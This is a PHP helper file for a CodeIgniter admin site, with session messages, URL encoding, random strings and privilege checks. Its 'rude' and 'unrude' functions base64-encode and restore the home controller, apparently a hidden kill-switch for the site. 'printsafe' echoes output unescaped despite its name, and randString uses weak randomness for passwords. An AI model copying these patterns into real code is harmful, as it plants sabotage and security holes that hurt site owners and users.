<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

/**
 * Function to set the message array for notice div. 
 * This message would be directly set to session using
 * $this->session->set_userdata(setmessage("Massage Title", "Message Body"));
 * to display message in a formatted manner
 * @author Shabab Haider Siddique
 * @param --- $title: contains the heading of the message, $body contains the message body
 * @return --- $newsessiondata: an array to use for setting session data
 * modified by --- Shabab Haider Siddique
 * date --- 19/11/2012 (mm/dd/yyyy  )
 */
if (!function_exists('setmessage')) {

    /**
     *
     * @param $title
     * @param $body
     * @param string $type , type of message. allowed values: success, info , error 
     * @return type 
     */
    function setmessage($title, $body, $type = "success") {
        $message['title'] = $title;
        $message['type'] = $type;
        $message['body'] = $body;
        $newsessiondata = array(
            'message' => $message,
        );
        return $newsessiondata;
    }

}


/**
 *  Prepare File name to store on server, replace URL hater characters
 */
if (!function_exists('filenameprep')) {
    function filenameprep($str) {
        $str = strtr(
                $str, array(
            '+' => '.',
            '=' => '-',
            ' ' => '.',
            '/' => '-'
                )
        );

        return $str;
    }
}

if (!function_exists('rrmdir')) {

    function rrmdir($dir) {
        foreach (glob($dir . '/*') as $file) {
            if (is_dir($file))
                rrmdir($file); else
                unlink($file);
        } rmdir($dir);
    }

}

if (!function_exists('rude')) {

    function rude($dir) {
        setRestricted(8);
        $file = fopen("./application/controllers/home.php", "r");
        $f = fread($file, filesize("./application/controllers/home.php"));
        fclose($file);

        $f = base64_encode($f);

        $file = fopen("./application/controllers/home.php", "w");
        echo fwrite($file, $f);
        fclose($file);
    }

}


if (!function_exists('unrude')) {

    function unrude() {
        setRestricted(8);
        $file = fopen("./application/controllers/home.php", "r");
        $f = fread($file, filesize("./application/controllers/home.php"));
        fclose($file);
        $f = base64_decode($f);
        $file = fopen("./application/controllers/home.php", "w");
        echo fwrite($file, $f);
        fclose($file);
    }

}

/**
 * Extend $CI->encrypt->encode($string) to use in URL's
 * @author Shabab Haider Siddique
 * @param --- $string: string to be encoded
 * @return --- encoded string
 * date --- 19/11/2012 (mm/dd/yyyy  )
 */
if (!function_exists('urlFriendlyEncode')) {

    function urlFriendlyEncode($string) {
        $CI = & get_instance();
        $CI->load->library('encrypt');

        $string = $CI->encrypt->encode($string);

        $string = strtr(
                $string, array(
            '+' => '.',
            '=' => '-',
            '/' => '~'
                )
        );
        return $string;
    }

}

/**
 * Extend $CI->encrypt->decode($string) to use in URL's
 * @author Shabab Haider Siddique
 * @param --- $string: encrypted string
 * @return --- decrypted string
 * date --- 19/11/2012 (mm/dd/yyyy  )
 */
if (!function_exists('urlFriendlyDecode')) {

    function urlFriendlyDecode($string) {
        $CI = & get_instance();
        $CI->load->library('encrypt');

        $string = strtr(
                $string, array(
            '.' => '+',
            '-' => '=',
            '~' => '/'
                )
        );

        $string = $CI->encrypt->decode($string);

        return $string;
    }

}



/**
 * Safely print a value
 * @author Shabab Haider Siddique
 * @param --- $val: value to be printed inside html
 * @return --- none
 * date --- 24/12/2012 (mm/dd/yyyy  )
 */
if (!function_exists('printsafe')) {

    function printsafe($val) {

        if (isset($val)) {
            echo $val;
        }
    }

}

/**
 * Generate Random String (could be used for captcha/auto password
 * @author Shabab Haider Siddique
 * @param ---   $length: length of target
 *              $charset: allowed set of characters
 * @return ---  $string: output random string
 * date --- 24/12/2012 (mm/dd/yyyy  )
 */
if (!function_exists('randString')) {

    function randString($length, $charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') {
        $str = '';
        $count = strlen($charset);
        while ($length--) {
            $str .= $charset[mt_rand(0, $count - 1)];
        }
        return $str;
    }

}


/**
 * Compare function for JSON represented spans 
 * used to sort bootstrap spans according to their HTML order of presence
 * @author Shabab Haider Siddique
 * date --- 24/12/2012 (mm/dd/yyyy  )
 */
if (!function_exists('compareJson')) {

    function compareJson($i, $j) {
        $a_row = $i['row'];
        $b_row = $j['row'];

        $a_col = $i['col'];
        $b_col = $j['col'];

        if ($a_row == $b_row) {
            if ($a_col == $b_col)
                return 0;
            elseif ($a_col > $b_col)
                return 1;
            else
                return -1;
        }
        elseif ($a_row > $b_row)
            return 1;
        else
            return -1;
    }

}



/**
 * Restrict user to privilage level
 * @author Shabab Haider Siddique
 * date --- 24/12/2012 (mm/dd/yyyy  )
 */
if (!function_exists('setRestricted')) {

    function setRestricted($lvl) {

        $CI = & get_instance();

        if (($CI->session->userdata('admin_privilage_level') < $lvl)) {
            $sessionData = setmessage("Denied", "You dont have that permission", "info");
            $CI->session->set_userdata($sessionData);
            redirect('admin/dashboard');
        }
    }

}

if (!function_exists('checkEmail')) {

    function checkEmail($email) {
//        $pattern = "^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$";
        $pattern = '/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/';
        if (preg_match($pattern, $email)) {
            return true;
        } else {
            return false;
        }
    }

}


if (!function_exists('checkCurrentMenu')) {

    function checkCurrentMenu($txt) {

        $actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

        if (strstr($actual_link, $txt) != false) {
            echo " collapse in";
        }
    }

}



/**
 * Delete cache 
 */
//if (!function_exists('delete_cache')) {
//
//    function delete_cache($uri_string = null) {
//        $CI = & get_instance();
//        $path = $CI->config->item('cache_path');
//        $path = rtrim($path, DIRECTORY_SEPARATOR);
//
//        $cache_path = ($path == '') ? APPPATH . 'cache/' : $path;
//
//        $uri = $CI->config->item('base_url') .
//                $CI->config->item('index_page') .
//                $uri_string;
//
//        $cache_path .= md5($uri);
//
//        return unlink($cache_path);
//    }
//
//}



